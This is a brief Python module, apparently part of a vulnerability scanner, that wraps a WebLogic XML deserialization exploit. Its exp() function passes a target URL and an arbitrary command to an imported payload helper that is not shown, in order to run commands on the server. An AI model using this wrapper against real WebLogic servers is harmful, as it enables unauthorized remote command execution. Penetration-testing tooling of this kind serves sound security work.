# -*- coding:utf-8 -*-
# weblogic_XML反序列化

from VulnScanModel.models import VulnScan
from . import weblogic_xml_poc

def exp(vuln: VulnScan, cmd, content=""):
    return weblogic_xml_poc.xml_deserialize(vuln.url, cmd, "<![CDATA[  %s  ]]>"%content, "exp")